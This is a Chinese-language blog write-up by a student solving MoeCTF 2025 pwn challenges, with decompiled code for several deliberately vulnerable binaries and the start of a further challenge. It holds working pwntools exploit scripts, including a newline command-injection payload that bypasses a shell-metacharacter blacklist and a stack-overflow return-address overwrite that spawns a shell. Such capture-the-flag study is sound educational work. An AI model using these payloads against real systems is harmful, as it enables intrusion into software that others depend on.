<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Moectf2025 pwn | LightCloveyou's Blog</title><meta name="author" content="LightCloveyou"><meta name="copyright" content="LightCloveyou"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="选择你喜欢的，坚持你选择的，热爱你坚持的">
<meta property="og:type" content="article">
<meta property="og:title" content="Moectf2025 pwn">
<meta property="og:url" content="https://lightcloveyou.github.io/2025/10/12/Moectf2025-pwn/index.html">
<meta property="og:site_name" content="LightCloveyou&#39;s Blog">
<meta property="og:description" content="选择你喜欢的，坚持你选择的，热爱你坚持的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lightcloveyou.github.io/img/1.jpg">
<meta property="article:published_time" content="2025-10-12T02:54:44.000Z">
<meta property="article:modified_time" content="2025-11-25T09:45:30.465Z">
<meta property="article:author" content="LightCloveyou">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lightcloveyou.github.io/img/1.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Moectf2025 pwn",
  "url": "https://lightcloveyou.github.io/2025/10/12/Moectf2025-pwn/",
  "image": "https://lightcloveyou.github.io/img/1.jpg",
  "datePublished": "2025-10-12T02:54:44.000Z",
  "dateModified": "2025-11-25T09:45:30.465Z",
  "author": [
    {
      "@type": "Person",
      "name": "LightCloveyou",
      "url": "https://LightCloveyou.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://lightcloveyou.github.io/2025/10/12/Moectf2025-pwn/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":1000,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Moectf2025 pwn',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500&display=swap"><link rel="stylesheet" href="https://fontsapi.zeoseven.com/442/main/result.css"><meta name="generator" content="Hexo 8.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">LightCloveyou's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Moectf2025 pwn</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Moectf2025 pwn</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-12T02:54:44.000Z" title="发表于 2025-10-12 10:54:44">2025-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-25T09:45:30.465Z" title="更新于 2025-11-25 17:45:30">2025-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Competiton/">Competiton</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">21.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>110分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="moectf2025-新生赛">Moectf2025 新生赛</h1>
<p>本人是大一新生，刚入门pwn，参加了Moectf2025的新生赛，想写一篇文章记录一下，如果有任何文章问题，望指正。</p>
<p>在这里特别感谢Maple师傅的指导。</p>
<p>文章里的题目顺序并不是按难度排的。</p>
<h3 id="ez_u64">ez_u64</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">__int64 v1; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Ya hello! Let&#x27;s play a game.&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Guess which number I&#x27;m thinking of.&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here is the hint.&quot;</span>);</span><br><span class="line">write(<span class="number">1</span>, &amp;num, <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%zu&quot;</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 != num )</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Wrong answer!&quot;</span>);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Try pwntools u64?&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Win!&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Here is the hint.&quot;</span>)</span><br><span class="line">leaked_data = p.recv(<span class="number">8</span>)</span><br><span class="line">log.info(<span class="string">f&quot;leak data: <span class="subst">&#123;leaked_data.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">num = u64(leaked_data)</span><br><span class="line">log.info(<span class="string">f&quot;data: <span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>[DEBUG] Received 0x5b bytes: 00000000 59 61 20 68 65 6c 6c 6f 21 20 4c 65 74 27 73 20 │Ya h│ello│! Le│t’s │</p>
<p>00000010 70 6c 61 79 20 61 20 67 61 6d 65 2e 0a 47 75 65 │play│ a g│ame.│·Gue│</p>
<p>00000020 73 73 20 77 68 69 63 68 20 6e 75 6d 62 65 72 20 │ss w│hich│ num│ber │</p>
<p>00000030 49 27 6d 20 74 68 69 6e 6b 69 6e 67 20 6f 66 2e │I’m │thin│king│ of.│</p>
<p>00000040 48 65 72 65 20 69 73 20 74 68 65 20 68 69 6e 74 │Here│ is │the │hint│</p>
<p>00000050 2e ea 1e 03 77 ac 92 b2 d2 0a 3e │.···│w···│··&gt;│</p>
<p>0000005b</p>
<p>[*] 泄露的数据: ea1e0377ac92b2d2</p>
<p>[*] 转换后的数值: 15182358563248086762</p>
</blockquote>
<h3 id="find_it">find_it</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> file[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  fd = dup(<span class="number">1</span>);</span><br><span class="line">  write(fd, <span class="string">&quot;I&#x27;ve hidden the fd of stdout. Can you find it?\n&quot;</span>, <span class="number">0x2Fu</span>LL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;fd1);</span><br><span class="line">  write(fd1, <span class="string">&quot;You are right.What would you like to see?\n&quot;</span>, <span class="number">0x2Au</span>LL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s%*c&quot;</span>, file);</span><br><span class="line">  open(file, <span class="number">0</span>);</span><br><span class="line">  write(fd1, <span class="string">&quot;What is its fd?\n&quot;</span>, <span class="number">0x10u</span>LL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;fd2);</span><br><span class="line">  read(fd2, &amp;buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  write(fd1, &amp;buf, <span class="number">0x50u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道考的是文件标志符，3，flag，1就行了</p>
<h3 id="inject">inject</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to server maintainance system.&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _printf_chk(</span><br><span class="line">      <span class="number">1LL</span>,</span><br><span class="line">      <span class="string">&quot;1. List processes\n2. Check disk usage\n3. Check network activity\n4. Test connectivity\n5. Exit\nYour choice: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)_isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v4) &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        execute(<span class="string">&quot;ps aux&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        execute(<span class="string">&quot;df -h&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        execute(<span class="string">&quot;netstat -ant&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        ping_host();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数没有什么漏洞，查看ping_host()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">ping_host</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *buf_1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *command_1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+1h] [rbp-51h]</span></span><br><span class="line">  _QWORD buf[<span class="number">2</span>]; <span class="comment">// [rsp+2h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> command[<span class="number">40</span>]; <span class="comment">// [rsp+12h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+3Ah] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  _printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Enter host to ping: &quot;</span>);</span><br><span class="line">  buf_1 = buf;</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0xFu</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;v4 + v1) == <span class="number">10</span> )</span><br><span class="line">    *(&amp;v4 + v1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)check(buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    buf_1 = &amp;qword_20;</span><br><span class="line">    _snprintf_chk(command, <span class="number">32LL</span>, <span class="number">1LL</span>, <span class="number">32LL</span>, <span class="string">&quot;ping %s -c 4&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">    command_1 = command;</span><br><span class="line">    execute(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    command_1 = <span class="string">&quot;Invalid hostname or IP!&quot;</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid hostname or IP!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = v7 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    _stack_chk_fail(command_1, buf_1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">check</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strpbrk</span>(s, <span class="string">&quot;;&amp;|&gt;&lt;$()&#123;&#125;[]&#x27;\&quot;`\\!~*&quot;</span>) == <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以执行我们输入的内容和原有内容的组合，不能带有check函数中的符号</p>
<p>，是可以通过check函数的</p>
<p>cat flag命令没有参数，所以要将后面的省略了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Enter host to ping: &#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;1\ncat flag\n#&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>执行的是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 1</span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line"><span class="comment"># -c 4</span></span><br></pre></td></tr></table></figure>
<h3 id="ret2text">Ret2text</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Stack overflow is a powerful art!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;In this MoeCTF,I will show you the charm of PWN!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You need to understand the structure of the stack first.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Then how many bytes do you need to overflow the stack?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  overflow(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">overflow</span><span class="params">(<span class="type">int</span> n7)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( n7 &lt;= <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Come on, you can&#x27;t even fill up this array?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, n7);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK,I receive your byte.and then?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public treasure</span><br><span class="line">.text:00000000004011B6 treasure        proc near</span><br><span class="line">.text:00000000004011B6 ; __unwind &#123;</span><br><span class="line">.text:00000000004011B6                 endbr64</span><br><span class="line">.text:00000000004011BA                 push    rbp</span><br><span class="line">.text:00000000004011BB                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011BE                 lea     rax, s          ; &quot;Congratulations! You got the secret!&quot;</span><br><span class="line">.text:00000000004011C5                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004011C8                 call    _puts</span><br><span class="line">.text:00000000004011CD                 lea     rax, command    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004011D4                 mov     rdi, rax        ; command</span><br><span class="line">.text:00000000004011D7                 call    _system</span><br><span class="line">.text:00000000004011DC                 nop</span><br><span class="line">.text:00000000004011DD                 pop     rbp</span><br><span class="line">.text:00000000004011DE                 retn</span><br><span class="line">.text:00000000004011DE ; &#125; // starts at 4011B6</span><br><span class="line">.text:00000000004011DE treasure        endp</span><br></pre></td></tr></table></figure>
<p>简单的栈溢出，适用于没有PIE保护、无canary、可以溢出足够长并且具有后门函数的情况</p>
<p>8个A覆盖buf[8]，8字节覆盖rbp，8字节覆盖返回地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Then how many bytes do you need to overflow the stack?&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">32</span>))</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401310</span>)+p64(<span class="number">0x4011CD</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>通常情况下，最好选择返回地址为关键部分，否则可能出现某些错误，比如说这道题可能出现栈没对齐的情况</p>
<h3 id="ret2shellcode">Ret2shellcode</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> prot; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> n10; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  s = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( s == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000u</span>LL);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  prot = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;In a ret2text exploit, we can use code in the .text segment.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But now, there is no &#x27;system&#x27; function available there.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How can you get the flag now? Perhaps you should use shellcode.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But what is shellcode? What can you do with it? And how can you use it?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you some choices. Choose wisely!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n4);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    